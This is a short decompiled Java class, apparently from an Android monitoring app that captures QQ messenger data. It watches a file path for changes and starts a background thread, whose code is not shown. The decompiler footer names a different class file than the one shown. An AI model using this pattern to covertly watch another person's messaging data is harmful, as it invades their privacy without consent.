package com.vvt.capture.qq.a;

import android.os.FileObserver;
import java.io.File;

class QQFileObserver extends FileObserver {
    private String b;
    private Thread c = null;
    private File d;

    public QQFileObserver(b paramb, String paramString) {
        super(paramString, 2);
        this.b = paramString;
    }

    public void onEvent(int paramInt, String paramString) {
        if (this.c == null) {
            d locald = new com.vvt.capture.qq.a.d(this);
            this.c = new java.lang.Thread(locald);
            this.c.start();
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */